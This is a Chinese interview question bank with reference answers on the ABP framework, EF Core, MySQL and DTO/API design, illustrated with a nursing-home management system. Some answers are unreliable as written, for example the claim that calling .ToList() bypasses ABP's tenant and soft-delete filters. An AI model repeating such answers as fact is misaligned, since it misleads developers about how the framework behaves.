**参考答案**：`IOptionsMonitor<T>` 内部持有一个 `IOptionsChangeTokenSource<T>`，它使用 `IChangeToken` 机制监听变化。对于文件配置源，当 `reloadOnChange: true` 时，底层使用 `FileSystemWatcher` 监听文件变化。文件变化时触发 `IChangeToken` 的回调，`OptionsMonitor` 收到通知后重新从 `IConfigurationRoot` 读取值并创建新的 Options 实例，然后触发 `OnChange` 回调。这是一个观察者模式的典型应用。

---


## 第 04 章：ABP 框架深度解析

### 第1题（初级 / 概念题）
**题目**：ABP 模块的生命周期分为哪几个阶段？各阶段能做什么？

**参考答案**：三个阶段——`PreConfigureServices`（前置配置，条件性替换服务，如替换默认的序列化器）、`ConfigureServices`（核心阶段，注册服务、配置选项、注册 AutoMapper Profile，养老院系统中注册 `IElderAppService` 等业务服务就在此阶段）、`OnApplicationInitialization`（应用启动时，配置中间件、初始化种子数据，如初始化默认角色、管理员账号、基础数据字典）。例如养老院系统的 `YlsMemberModule` 在 `ConfigureServices` 中注册长者管理相关服务，在 `OnApplicationInitialization` 中初始化默认护理等级数据。

---

### 第2题（初级 / 概念题）
**题目**：[DependsOn] 特性的作用是什么？

**参考答案**：声明当前模块依赖的其他模块。框架根据依赖关系自动确定模块的加载和初始化顺序，类似于拓扑排序。被依赖的模块先初始化。例如养老院的 `YlsFinanceModule` 通过 `[DependsOn(typeof(YlsMemberModule))]` 声明依赖长者模块，确保长者实体和仓储先注册完成，财务模块才能正常引用。如果不声明依赖，框架可能先初始化财务模块，此时注入 `IRepository<Elder>` 会失败。

---

### 第3题（初级 / 概念题）
**题目**：DDD 分层中，Domain.Shared 和 Domain 层有什么区别？

**参考答案**：Domain.Shared 是最底层，包含枚举、常量、通用异常等不依赖具体业务的共享定义，所有层都能引用。Domain 层包含实体、值对象、领域服务、仓储接口等核心业务逻辑，依赖 Domain.Shared。以养老院系统为例：`ElderGender`（性别枚举）、`NursingHomeConsts`（系统常量）放在 Domain.Shared；`Elder`（长者实体）、`IElderRepository`（仓储接口）、`BillManager`（账单领域服务）放在 Domain 层。区分的关键：Domain.Shared 的东西可以被任何层使用，Domain 的东西只有 Application 层及以上才能引用。

---

### 第4题（中级 / 概念题）
**题目**：为什么 Application 层不能被 Domain 层引用？

**参考答案**：因为 DDD 的依赖方向是上层依赖下层。Application 层是 Domain 层的"消费者"，如果 Domain 引用 Application，就形成了循环依赖，破坏了分层架构的隔离性和可测试性。

---

### 第5题（中级 / 概念题）
**题目**：ABP 的"约定优于配置"体现在哪些方面？

**参考答案**：主要体现在四个方面——自动仓储注册（实体自动获得 IRepository 实现）、自动 API Controller（ApplicationService 自动暴露为 REST API）、自动模块依赖（AbpModule 隐式依赖 AbpKernelModule）、审计字段自动填充（FullAuditedEntity 自动维护 CreationTime 等字段）。

---

### 第6题（中级 / 代码题）
**题目**：AutoMapper 的 ForMember 和 Ignore 分别用于什么场景？

**参考答案**：`ForMember` 用于自定义映射逻辑——当属性名不同、需要类型转换或条件映射时使用。`Ignore` 用于排除不需要映射的字段——如敏感信息、内部标记字段。

---

### 第7题（中级 / 概念题）
**题目**：ReverseMap 有什么注意事项？

**参考答案**：`ReverseMap` 会创建反向映射并继承正向的 `ForMember` 配置。但注意：正向 `Ignore` 的字段在反向也会被忽略；`MapFrom` 的映射关系在反向时自动反转。如果正向和反向的忽略逻辑不同，需要在 `ReverseMap()` 后链式调用重新配置。

---

### 第8题（初级 / 概念题）
**题目**：ABP 中工作单元什么时候自动开启？

**参考答案**：继承自 `ApplicationService` 的类的公开虚方法会自动开启工作单元。方法正常结束时自动提交事务，抛出异常时自动回滚。

---

### 第9题（中级 / 概念题）
**题目**：嵌套工作单元的行为是什么？

**参考答案**：默认情况下，内层工作单元不会创建新事务，而是与外层共享同一个事务（传播行为为 `Propagation.Required`）。如果需要独立事务，使用 `Propagation.RequiresNew`。

---

### 第10题（中级 / 场景题）
**题目**：什么时候应该手动管理工作单元？

**参考答案**：在非 ApplicationService 类中需要事务支持时——如领域服务、后台任务、自定义管道。通过注入 `IUnitOfWorkManager` 并调用 `BeginAsync()` 手动开启，用 `using` 包裹并在结束时调用 `CompleteAsync()`。

---

### 第11题（中级 / 概念题）
**题目**：IsTransactional = false 的使用场景是什么？

**参考答案**：只读查询场景。关闭事务可以减少数据库锁竞争，提升并发性能。通过 `[UnitOfWork(IsTransactional = false)]` 特性标记或全局配置。

---

### 第12题（初级 / 概念题）
**题目**：创建自定义 ABP 模块需要哪些步骤？

**参考答案**：五步——①创建解决方案和各层类库项目；②配置项目间的引用关系（严格遵守 DDD 依赖方向）；③为每个项目定义继承 AbpModule 的模块类；④在模块类的 ConfigureServices 中注册服务和配置选项；⑤在主应用的根模块中通过 [DependsOn] 引入新模块。

---

### 第13题（中级 / 代码题）
**题目**：AutoMapper 嵌套对象映射失败怎么解决？

**参考答案**：如果 DTO 中包含嵌套对象类型（如 `RoomDto`），必须为嵌套类型也创建 `CreateMap<Room, RoomDto>()` 映射规则。否则 AutoMapper 不知道如何转换嵌套属性。

---

### 第14题（高级 / 场景题）
**题目**：工作单元中执行耗时操作会有什么问题？

**参考答案**：工作单元持有数据库连接和事务锁。如果在 UoW 内执行耗时操作（如调用外部 API、发送邮件），会长时间占用连接，导致连接池耗尽、数据库锁竞争加剧。应将耗时操作移到 UoW 之外，或使用 `EventBus.Publish` 异步处理。

---


## 第 05 章：ABP 内置模块与基础设施

### 第1题（中级 / 概念题）
**题目**：ABP 的软删除是如何实现的？为什么查询时已删除数据会自动过滤？

**参考答案**：ABP 通过 EF Core 的全局查询过滤器（Global Query Filter）实现软删除。在 `AbpDbContext` 的 `OnModelCreating` 中，框架自动为所有实现了 `ISoftDelete` 接口的实体注册 `HasQueryFilter(e => !e.IsDeleted)`，这样每次查询都会自动附加 `WHERE IsDeleted = 0` 条件。开发者无需手动加 `Where(x => !x.IsDeleted)`，查询逻辑完全透明。例如养老院系统中，长者退住后只需设置 `IsDeleted = true`，所有列表查询自动排除已退住长者。需要注意：软删除的实体仍存在于数据库中，只是被标记，如果需要物理删除（如清理过期数据），要使用 `HardDelete` 或直接执行 SQL。

---

### 第2题（初级 / 代码题）
**题目**：如何临时查看已软删除的数据？

**参考答案**：注入 `IDataFilter<ISoftDelete>` 服务，在 `using` 块内调用 `Disable()` 方法临时禁用过滤器。代码示例：`using (_softDeleteFilter.Disable()) { var all = await _repo.GetListAsync(); }`——在 using 块内，全局过滤器被临时移除，查询会返回包括已删除在内的所有数据。出块后过滤器自动恢复。典型场景：养老院院长需要查看已退住长者的完整名单，或管理员需要恢复误删除的数据。注意 `Disable()` 返回的 `IDisposable` 必须用 using 包裹，否则过滤器可能不会恢复，导致后续查询遗漏数据。

---

### 第3题（初级 / 概念题）
**题目**：ABP 设置管理的三个作用域和优先级？

**参考答案**：ABP 设置管理有三个作用域——Application（应用级别，全局默认值）、Tenant（租户级别，每个养老院可独立配置）、User（用户级别，每个用户可个性化设置）。优先级从高到低：User > Tenant > Application > SettingDefinition 中定义的默认值。例如养老院系统的「收费标准」设置：默认值 3000 元/月（定义时），A 养老院设为 3500 元（Tenant 级别），某位长者享受折扣设为 2800 元（User 级别）。`ISettingProvider.GetAsync("收费")` 会按优先级逐级查找，返回最精确的值。

---

### 第4题（初级 / 概念题）
**题目**：ISettingProvider 和 ISettingManager 的区别？

**参考答案**：`ISettingProvider` 是只读接口，用于业务服务中读取配置值（如 `await _settingProvider.GetAsync<string>("Yls.MaxElderCount")`），它按 User > Tenant > Application 的优先级自动查找。`ISettingManager` 是读写接口，用于管理后台修改配置值（如 `await _settingManager.SetGlobalAsync("Yls.MaxElderCount", "200")`），支持按作用域设置。两者遵循读写分离原则：业务代码只读不写，管理后台才写入。这样设计的好处是业务逻辑不会意外修改配置，同时管理界面可以灵活调整系统参数。

---

### 第5题（中级 / 概念题）
**题目**：ABP 多租户数据隔离如何实现？

**参考答案**：ABP 为所有实现了 `IMultiTenant` 接口的实体在 DbContext 中注册全局查询过滤器 `WHERE TenantId = @currentTenantId`。当前租户 ID 通过 `ICurrentTenant` 服务自动获取（从请求头、Cookie 或域名中解析）。例如养老院系统中，A 院和 B 院共用一套代码和数据库，但 A 院的护理员查询长者列表时，SQL 自动附加 `WHERE TenantId = 'A院的Guid'`，只能看到本院数据。开发者无需在每个查询中手动加租户条件，数据隔离完全透明。切换租户使用 `using (_currentTenant.Change(tenantId))` 临时切换。

---

### 第6题（高级 / 场景题）
**题目**：全局查询过滤器对性能的影响？

**参考答案**：全局查询过滤器为每个查询附加额外的 WHERE 条件，对性能有两方面影响：正面影响是减少了返回的数据量（只查未删除、当前租户的数据）；负面影响是每次查询都多一个条件，如果没有合适的索引会导致全表扫描。优化方案：为 `IsDeleted` 和 `TenantId` 建复合索引，例如 `CREATE INDEX IX_Elder_TenantId_IsDeleted ON Elders(TenantId, IsDeleted)`。在养老院系统中，长者表数据量大且频繁按租户+软删除查询，这个复合索引可以将查询从全表扫描优化为索引范围扫描。注意：过多的全局过滤器也会增加 DbContext 初始化开销。

---

### 第7题（高级 / 代码题）
**题目**：如何自定义数据过滤器？

**参考答案**：自定义数据过滤器分三步：第一步定义过滤器接口，如 `public interface IVip { bool IsVip { get; } }`；第二步让实体实现该接口，如 `public class Elder : ..., IVip { public bool IsVip { get; set; } }`；第三步在 DbContext 的 `OnModelCreating` 中注册全局过滤器：`builder.Entity<Elder>().HasQueryFilter(e => !DataFilter.IsEnabled<IVip>() || e.IsVip)`——当过滤器启用时只返回 VIP 长者，禁用时返回全部。使用时通过 `using (DataFilter.Disable<IVip>())` 临时禁用。养老院场景：VIP 长者享受优先护理，护理站默认只显示 VIP 列表，需要时可查看全部。

---

### 第8题（初级 / 概念题）
**题目**：ABP 审计日志默认记录哪些信息？

**参考答案**：ABP 审计日志默认记录以下信息：操作人（UserId、UserName、TenantId）、操作时间（ExecutionTime）、执行耗时（Duration）、服务名（ServiceName）、方法名（MethodName）、HTTP 方法和路径、请求参数（序列化为 JSON）、返回值、客户端 IP 地址、浏览器信息、异常信息（如果有）。启用实体变更追踪后，还会记录 EntityChangeSet：哪些实体被创建/修改/删除、每个实体的哪些属性发生了变化（包含旧值和新值）。养老院场景：修改长者护理等级时，审计日志会记录「张三于 2026-07-10 14:30 将长者李大爷的护理等级从『自理』改为『半护理』」。

---

### 第9题（初级 / 代码题）
**题目**：如何禁用审计日志？

**参考答案**：有两种方式禁用审计日志：第一种是特性方式，在类或方法上加 `[DisableAuditing]`，如 `[DisableAuditing] public async Task<List<ElderDto>> GetAllAsync()` 可以跳过该方法的审计记录；第二种是配置方式，在模块的 `ConfigureServices` 中将类型加入忽略列表：`Configure<AbpAuditingOptions>(options => { options.IgnoredTypes.Add(typeof(HealthCheckService)); })`。典型场景：养老院系统的健康数据轮询接口每 5 秒调用一次，如果每次都记录审计日志会产生大量无用数据，应该禁用。建议只对写操作（增删改）保留审计，纯读操作可以关闭。

---

### 第10题（初级 / 概念题）
**题目**：本地化资源文件的格式和规则？

**参考答案**：本地化资源文件是嵌入式 JSON 文件，放在项目的 `Localization/<ResourceName>/` 目录下，文件名格式为 `{culture}.json`（如 `zh-Hans.json`、`en.json`）。JSON 内容是键值对结构：`{ "Elder:Name": "长者姓名", "Elder:Age": "年龄" }`。需要在 `.csproj` 中设置 `<EmbeddedResource Include="Localization\Yls\*.json" />`，并在模块中注册：`Configure<AbpVirtualFileSystemOptions>(o => o.FileSets.AddEmbedded<YourModule>());` 和 `Configure<AbpLocalizationOptions>(o => o.Resources.Add<YlsResource>("Yls").AddVirtualJson("/Localization/Yls"));`。使用时注入 `IStringLocalizer<YlsResource>`，通过 `L["Elder:Name"]` 获取当前语言的文本。

---

### 第11题（中级 / 概念题）
**题目**：功能开关与设置管理的区别？

**参考答案**：功能开关控制的是「功能模块是否可用」，作用域通常为租户级别，判断的是「这个养老院有没有开通智能监护功能」；设置管理控制的是「功能模块内部的参数值」，有三个作用域（Application/Tenant/User），判断的是「智能监护的告警阈值是多少」。代码层面：功能开关用 `IFeatureChecker.IsEnabledAsync("SmartMonitoring")` 检查，通常配合 `[RequiresFeature("SmartMonitoring")]` 特性在 Controller 级别拦截；设置管理用 `ISettingProvider.GetAsync("Yls.AlarmThreshold")` 读取具体值。简单说：功能开关是「有没有」，设置管理是「是多少」。

---

### 第12题（高级 / 场景题）
**题目**：超级管理员如何查看所有租户数据？

**参考答案**：超级管理员需要临时禁用租户过滤器来查看所有租户的数据。代码示例：`using (_unitOfWorkManager.Current.DisableFilter(AbpDataFilterNames.MayHaveTenant)) { var allElders = await _elderRepo.GetListAsync(); }`——在 using 块内，`WHERE TenantId = @currentTenantId` 条件被移除，查询返回所有租户的长者数据。出块后过滤器自动恢复。养老院集团场景：总部管理员需要查看所有分院的入住率统计，但日常操作时每个分院只能看到自己的数据。注意：禁用过滤器后查询的数据量可能很大，建议配合分页使用，避免一次性加载过多数据导致内存溢出。

---

### 第13题（中级 / 概念题）
**题目**：审计日志中实体变更追踪记录什么？

**参考答案**：ABP 的实体变更追踪（Entity Change Tracking）记录三类信息：第一，实体变更概要——实体类型名称、变更类型（Created/Updated/Deleted）、实体主键 ID、变更时间；第二，属性变更详情——每个被修改的属性的属性名、原始值（OldValue）、新值（NewValue），只有实际发生变化的属性才会被记录；第三，关联信息——关联的审计日志 ID、租户 ID。例如在养老院系统中，修改长者信息时：`Elder` 实体 `Updated`，属性 `NursingLevel` 从 `SelfCare` 改为 `SemiCare`，属性 `MonthlyFee` 从 `3000` 改为 `4500`。启用方式：`Configure<AbpAuditingOptions>(o => o.IsEnabledForEntity = true)`。

---


## 第 06 章：EF Core 进阶与数据库设计

### 第1题（初级 / 概念题）
**题目**：DbContext 为什么不能注册为 Singleton？

**参考答案**：DbContext 内部维护了 ChangeTracker（变更追踪器），它会记录所有已加载实体的状态和原始值快照。如果注册为 Singleton，所有请求共享同一个追踪器，会导致：①实体状态混乱；②多线程并发访问引发异常；③一级缓存数据污染。Scoped 保证每个请求有独立的 DbContext 实例。

---

### 第2题（初级 / 概念题）
**题目**：什么是变更追踪？EntityState 有哪几种状态？

**参考答案**：变更追踪是 EF Core 自动记录实体属性变化的机制。EntityState 有五种状态：Added（新增，将执行 INSERT）、Modified（已修改，将执行 UPDATE）、Deleted（已删除，将执行 DELETE）、Unchanged（未变化，不操作）、Detached（未被追踪）。

---

### 第3题（中级 / 概念题）
**题目**：什么是 N+1 查询问题？如何解决？

**参考答案**：N+1 问题是指查询主表 1 次后，遍历结果时每次访问导航属性又触发 1 次额外查询，总共 N+1 次。解决方案：①使用 Include 预加载（生成 JOIN）；②使用 Select 投影查询（只查需要的字段）；③禁用延迟加载。

---

### 第4题（中级 / 概念题）
**题目**：AsNoTracking 的作用是什么？什么时候用？

**参考答案**：AsNoTracking 让查询结果跳过变更追踪，不被 ChangeTracker 跟踪。适用于只读场景（如列表展示、报表查询），可减少内存分配和跟踪开销，性能提升 20%-50%。不适用于需要修改实体并 SaveChanges 的场景。

---

### 第5题（高级 / 概念题）
**题目**：MySQL 四种事务隔离级别分别解决什么问题？

**参考答案**：①READ UNCOMMITTED：最低级别，允许脏读；②READ COMMITTED：解决脏读，存在不可重复读；③REPEATABLE READ（MySQL 默认）：解决脏读和不可重复读，通过MVCC+Next-Key Lock大部分解决幻读；④SERIALIZABLE：完全串行，解决所有并发问题但性能最差。

---

### 第6题（高级 / 概念题）
**题目**：用养老院场景解释脏读、不可重复读、幻读的区别。

**参考答案**：脏读：财务部读到护理部未提交的费用修改，护理部回滚后数据无效。不可重复读：上午读到护理费200元，下午读到300元（中间被修改提交了）。幻读：统计80岁以上长者10位，中间新入住一位82岁老人，再统计变成11位。

---

### 第7题（高级 / 概念题）
**题目**：简述 MVCC 的工作原理。

**参考答案**：InnoDB 为每行维护隐藏列 DB_TRX_ID（最后修改的事务 ID）和 DB_ROLL_PTR（回滚指针）。修改数据时旧版本写入 Undo Log 形成版本链。快照读时创建 ReadView，沿版本链查找已提交且在 ReadView 创建前的版本，实现无锁读取。

---

### 第8题（高级 / 概念题）
**题目**：为什么 MySQL 在 RR 级别下仍可能出现幻读？

**参考答案**：快照读（普通 SELECT）通过 ReadView 机制不会出现幻读。但当前读（SELECT FOR UPDATE、UPDATE、DELETE）读取的是最新数据，如果在两次当前读之间有其他事务插入了新记录，就会出现幻读。解决方案是使用 Next-Key Lock（记录锁 + 间隙锁）锁住索引区间。

---

### 第9题（高级 / 概念题）
**题目**：解释 B+Tree 索引的结构及为什么 InnoDB 选择它。

**参考答案**：B+Tree 是多路平衡搜索树：非叶子节点只存索引键，叶子节点存完整数据并通过双向链表连接。选择原因：①矮胖结构减少磁盘 IO；②叶子有序链表支持范围查询；③查询性能稳定。二叉树/红黑树树高太大，Hash 不支持范围查询。

---

### 第10题（高级 / 概念题）
**题目**：什么是聚簇索引和非聚簇索引？什么是回表？

**参考答案**：聚簇索引叶子节点存完整行数据，InnoDB 表数据本身按主键组织。非聚簇索引叶子节点存主键值。通过二级索引查到主键后再到聚簇索引查完整行叫「回表」。覆盖索引可避免回表——索引已包含所有查询字段时直接返回。

---

### 第11题（高级 / 概念题）
**题目**：复合索引的最左前缀原则是什么？

**参考答案**：最左前缀原则要求查询条件从索引最左列开始连续使用。Index(a,b,c) 可用于：`WHERE a=1`、`WHERE a=1 AND b=2`、`WHERE a=1 AND b=2 AND c=3`。不能用于：`WHERE b=2`（跳过了 a）。`WHERE a=1 AND c=3` 只能用到 a 列，c 因跳过 b 无法使用。

---

### 第12题（中级 / 概念题）
**题目**：如何查看和分析 MySQL 的执行计划？

**参考答案**：使用 `EXPLAIN` 命令。关键列：`type`（访问类型，ALL < index < range < ref < eq_ref < const）、`key`（实际使用的索引，NULL 表示没用索引）、`rows`（预估扫描行数）、`Extra`（Using index 表示覆盖索引，Using filesort 表示文件排序需优化）。

---

### 第13题（中级 / 概念题）
**题目**：什么是数据库连接池？如何排查连接泄漏？

**参考答案**：连接池预先创建一批数据库连接，请求结束后归还而非销毁，避免频繁建立 TCP 连接的开销。排查连接泄漏：①监控 `Threads_connected` 是否持续增长；②检查代码中是否有未用 `using` 包裹的数据库连接；③EF Core 通常自动管理连接，但如果直接使用 ADO.NET，必须用 `using` 确保释放。

---

### 第14题（中级 / 概念题）
**题目**：IQueryable 的延迟执行是什么意思？

**参考答案**：IQueryable 只构建表达式树（拼 SQL），不立即执行查询。只有调用终结方法（ToListAsync、CountAsync 等）时才生成 SQL 发送到数据库。这允许链式拼接条件和排序，最终只执行一次查询。

---


## 第 07 章：实体设计与仓储模式进阶

### 第1题（初级 / 概念题）
**题目**：FullAuditedAggregateRoot 和 AuditedAggregateRoot 有什么区别？

**参考答案**：`FullAuditedAggregateRoot` 在 `AuditedAggregateRoot` 基础上额外实现了 `ISoftDelete` 接口，包含 `IsDeleted`、`DeleterId`、`DeletionTime` 三个字段，支持逻辑删除而非物理删除。养老院场景：长者实体用 `FullAuditedAggregateRoot`，退住时只标记删除，历史数据仍可查询；而餐食类型等字典表用 `Entity<Guid>` 即可，不需要审计也不需要软删除。

---

### 第2题（初级 / 概念题）
**题目**：值对象和实体有什么区别？

**参考答案**：实体有唯一标识（Id），生命周期内属性可变，通过 ID 判断相等；值对象无唯一标识，不可变，通过属性值判断相等。养老院场景：`Elder`（长者）是实体，有唯一 Guid，姓名可以修改；`Address`（地址）是值对象，换地址就是新的值对象，ABP 中通过 `ValueObject.GetAtomicValues()` 判断相等性。

---

### 第3题（中级 / 概念题）
**题目**：领域服务和应用服务的边界在哪里？

**参考答案**：应用服务负责用例编排（取数据、调服务、返 DTO、权限检查），是"流程指挥官"；领域服务包含不归属于单个实体的核心业务规则，是"业务专家"。养老院场景：`BillAppService` 编排入住流程（调用领域服务计算账单 → 保存 → 通知），`BillManager` 领域服务负责"根据护理等级和天数计算账单金额"的纯业务规则。领域服务不应依赖仓储，应用服务不应包含计算逻辑。

---

### 第4题（中级 / 概念题）
**题目**：为什么仓储接口不应返回 IQueryable？

**参考答案**：返回 `IQueryable` 会让调用方绕过聚合边界，直接构造任意查询，破坏封装性。且不同 ORM 的 `IQueryable` 实现不同，不利于切换底层实现。正确做法是返回实体列表或 DTO，内部封装查询条件。养老院场景：`IElderRepository.GetByNursingLevelAsync(level)` 封装查询逻辑，调用方不需要知道底层是 EF Core 还是 Dapper。

---

### 第5题（中级 / 概念题）
**题目**：AsyncExecuter 的作用是什么？为什么不能直接调用 .ToList()？

**参考答案**：`IAsyncQueryableExecuter` 是 ABP 的异步查询执行器，在执行前注入全局过滤器（多租户、软删除等）。直接调用 `.ToList()` 或 `.FirstOrDefault()` 会绕过 ABP 的执行管道，导致过滤器失效。养老院场景：不用 AsyncExecuter 查询长者列表，可能返回已退住的长者（软删除失效）或其他养老院的长者（租户过滤失效），造成数据泄露。

---

### 第6题（初级 / 概念题）
**题目**：值对象在 EF Core 中如何映射？

**参考答案**：使用 Owned Entity Type，在 `DbContext` 的 `OnModelCreating` 中通过 `OwnsOne` 配置映射。值对象的属性会映射到所属实体的表中，以列前缀区分。养老院场景：`Elder` 实体拥有 `Address` 值对象，映射后数据库表中会有 `Address_City`、`Address_Street` 等列，而不是单独的地址表。

---

### 第7题（初级 / 概念题）
**题目**：FromSqlRaw 和 FromSqlInterpolated 有什么区别？

**参考答案**：`FromSqlRaw` 接受原始 SQL 字符串和参数数组，参数化防注入；`FromSqlInterpolated` 接受内插字符串，EF Core 自动将插值参数化。两者都安全，但 `FromSqlRaw` 在动态构造 SQL 时更灵活。养老院场景：复杂统计报表（如按月统计各护理等级的收入）可能需要 `FromSqlRaw` 调用存储过程。

---

### 第8题（高级 / 场景题）
**题目**：什么时候应该使用原始 SQL 查询？

**参考答案**：复杂窗口函数、CTE 递归查询、存储过程调用、数据库特有功能（全文检索）、EF Core 生成的 SQL 性能不佳时。使用时需手动处理多租户和软删除过滤。养老院场景：生成"连续 3 个月未缴费长者"报表需要 LAG 窗口函数，EF Core 5.0 不支持，必须用原始 SQL。注意：原始 SQL 会绕过全局过滤器，需手动加 `AND TenantId = @tenantId AND IsDeleted = 0`。

---

### 第9题（初级 / 概念题）
**题目**：聚合根的职责是什么？外部能直接操作聚合内实体吗？

**参考答案**：聚合根是一致性边界的核心，外部只能通过聚合根访问内部实体。内部实体的增删改查必须通过聚合根的方法暴露。养老院场景：`HealthAssessment`（健康评估）是聚合根，`AssessmentItem`（评估项）是聚合内实体，添加评估项必须通过 `assessment.AddItem()` 方法，保证"每个评估至少包含一项"的业务规则不被绕过。

---

### 第10题（中级 / 概念题）
**题目**：IMultiTenant 接口的作用是什么？

**参考答案**：`IMultiTenant` 让 ABP 自动为实体添加租户过滤，查询时只返回当前租户的数据。底层通过 EF Core 全局查询过滤器 `WHERE TenantId = @currentTenantId` 实现。养老院系统中所有业务实体都应实现此接口，因为每个养老院是独立租户。如果不实现，查询会返回所有养老院的数据，造成严重数据泄露。

---

### 第11题（中级 / 概念题）
**题目**：EfCoreYlsRepositoryBase 自定义仓储基类有什么作用？

**参考答案**：继承 `EfCoreRepository`，封装公共查询逻辑（分页、排序、软删除处理），子仓储按需调用。养老院场景：所有仓储都需要"按创建时间倒序 + 分页"的通用查询，封装在基类的 `GetPagedListAsync` 方法中，子仓储只需传入过滤条件。避免每个仓储重复写分页逻辑。

---

### 第12题（高级 / 场景题）
**题目**：领域服务能直接注入 IRepository 吗？

**参考答案**：严格的 DDD 规范中，领域服务不应依赖仓储，应通过方法参数接收查询结果。但 ABP 中为了实用，允许在领域服务中注入仓储。关键原则是领域服务只处理传入的实体数据，不负责数据获取的编排。养老院场景：`BillManager.CalculateFee(elder, days)` 接收已查出的 elder 实体，而不是在内部调用 `_elderRepo.GetAsync(id)`。

---

### 第13题（初级 / 概念题）
**题目**：CreationAuditedAggregateRoot 适用于什么场景？

**参考答案**：适用于创建后不再修改的实体，只记录创建人和创建时间，不追踪修改历史。养老院场景：护理记录、打卡日志、访客登记等，这些记录一旦创建即为定稿，不需要追踪谁修改过。使用 `CreationAuditedEntity` 而非 `FullAuditedEntity` 可以减少 3 个审计字段（ModifierId、LastModificationTime、DeleterId 等），节省存储。

---


## 第 08 章：应用服务 DTO 与 API 设计规范

### 第1题（初级 / 概念题）
**题目**：CrudAppService 和自定义 AppService 什么时候用哪个？

**参考答案**：标准 CRUD 用 CrudAppService，复杂业务逻辑（涉及多实体联动、外部调用）用自定义 AppService。CrudAppService 本质是模板方法模式，封装了 Create/Update/Delete/Get/GetList 五个标准方法。养老院场景：长者基本信息管理用 CrudAppService 即可；但长者入住流程涉及创建长者 + 分配床位 + 生成账单 + 通知家属，需要自定义 AppService 编排多个领域服务。

---

### 第2题（初级 / 概念题）
**题目**：DTO 和 Dbo 有什么区别？

**参考答案**：DTO 放在 Contracts 层，用于增删改查的数据传输，前后端共享；Dbo 放在 Domain 层，是只读的展示对象，用于复杂查询结果。DTO 是契约（有 CreateDto/UpdateDto），Dbo 是视图（只有 GetDbo）。养老院场景：`ElderCreateDto` 用于新增长者（Contracts 层），`ElderBillDbo` 用于展示长者账单汇总（Domain 层，跨表 Join 结果）。

---

### 第3题（中级 / 概念题）
**题目**：ABP 如何自动验证 DTO？

**参考答案**：ABP 内置 `ValidationActionFilter`（ActionFilter 类型），当请求进入 Controller 时自动检查 DTO 上的 DataAnnotations（如 `[Required]`、`[StringLength]`）。验证失败直接返回 400 状态码和 `HttpValidationProblemDetails` 格式的错误详情，无需手动编写 `if (!ModelState.IsValid)` 代码。开发者只需在 DTO 属性上标注验证特性即可。

---

### 第4题（中级 / 概念题）
**题目**：CreateAndUpdateDto 中的 Guid? Id 有什么作用？

**参考答案**：`Guid? Id` 用于合并新增和修改的统一入口。当 Id 为 null 时视为新增（调用 InsertAsync），有值时视为修改（先 GetAsync 再赋值 UpdateAsync）。养老院场景：前端长者信息编辑页面，新增和修改共用同一个表单组件，只需判断 Id 是否有值即可，无需维护两套页面。这是 ABP 推荐的"合并新增修改"模式。

---

### 第5题（初级 / 概念题）
**题目**：Controller 方法参数为什么不加 [FromQuery] 和 [FromBody]？

**参考答案**：ASP.NET Core 的默认绑定规则已经足够：简单类型（int、string、Guid）自动从 Query String 绑定，复杂类型自动从 Request Body 绑定。显式标注虽然不报错，但增加了冗余代码，且与项目约定不一致。ABP 推荐不加，保持代码简洁。这是约定优于配置的体现。

---

### 第6题（中级 / 概念题）
**题目**：HTTP 状态码 201 和 204 分别在什么时候返回？

**参考答案**：201 Created 表示资源创建成功，响应头应包含 Location 指向新资源的 URL，Body 返回新创建的对象。204 No Content 表示操作成功但无返回内容，常用于 DELETE 操作。养老院系统中：POST /api/elder 创建长者返回 201，DELETE /api/elder/{id} 退住返回 204。ABP 的 CrudAppService 已内置此逻辑。

---

### 第7题（初级 / 代码题）
**题目**：分页查询时如何防止一次查询太多数据？

**参考答案**：继承 PagedAndSortedResultRequestDto 后，MaxResultCount 默认最大 1000。在 AppService 中可以用 `Math.Min(input.MaxResultCount, 100)` 进一步限制。养老院场景：长者列表接口限制每页最多 100 条，防止前端误传 pageSize=99999 导致全表查询。同时在 DTO 中设置 `[Range(1, 100)]` 做输入验证。

---

### 第8题（高级 / 场景题）
**题目**：ABP 中如何自定义异常的状态码映射？

**参考答案**：ABP 将 `BusinessException` 映射为 403，`EntityNotFoundException` 映射为 404，`AbpAuthorizationException` 映射为 401/403。可以通过自定义 `AbpExceptionStatusCodeProvider` 来修改映射规则。例如养老院系统中，床位已满时抛出的 `BedFullException` 可以映射为 409 Conflict。在模块的 ConfigureServices 中注册自定义 Provider。

---

### 第9题（中级 / 概念题）
**题目**：Swagger 在生产环境应该禁用吗？

**参考答案**：强烈建议生产环境禁用 Swagger UI，因为它暴露了所有 API 端点和参数结构，降低了安全性。可以通过 `if (env.IsDevelopment())` 条件注册 Swagger 中间件。如果必须在生产环境保留（如给合作方看文档），应加 IP 白名单或 Basic Auth 认证保护。

---

### 第10题（高级 / 场景题）
**题目**：分页查询的 totalCount 在 ABP 中是怎么获取的？

**参考答案**：继承 `CrudAppService` 的 `GetListAsync` 方法内部会自动执行两次查询：一次 `CountAsync` 获取总数，一次 `Skip/Take` 获取分页数据，最终封装为 `PagedResultDto<T>` 返回。开发者无需手动处理。如果用自定义 AppService，需要显式调用 `await query.CountAsync()` 和 `await query.PageBy(input).ToListAsync()`。养老院场景：长者列表页需要 totalCount 来计算总页数。

---

### 第11题（初级 / 概念题）
**题目**：DTO 中的 DataAnnotations 验证失败时，ABP 返回什么格式？

**参考答案**：ABP 返回 400 状态码，Body 是标准的 `HttpValidationProblemDetails` 格式，包含 `errors` 字典，Key 是属性名（camelCase），Value 是错误消息数组。例如：`{ "errors": { "name": ["The Name field is required."] } }`。前端可以据此高亮对应的表单字段并显示错误提示。

---

### 第12题（高级 / 场景题）
**题目**：如何为养老院系统的某个接口返回 201 Created 并带 Location 头？

**参考答案**：在 Controller 方法中使用 `CreatedAtAction`：`return CreatedAtAction(nameof(Get), new { id = entity.Id }, dto)`。ASP.NET Core 会自动设置 201 状态码和 Location 响应头（如 `/api/elder/uuid`）。ABP 的 CrudAppService 已内置此逻辑（CreateAsync 返回 EntityDto），自定义 AppService 需手动处理。前端收到 201 后可通过 Location 头跳转到新资源详情页。

---


## 第 09 章：设计模式与架构原则

### 第1题（高级 / 设计题）
**题目**：请解释 SOLID 五大原则，每个举一个养老院系统的例子。

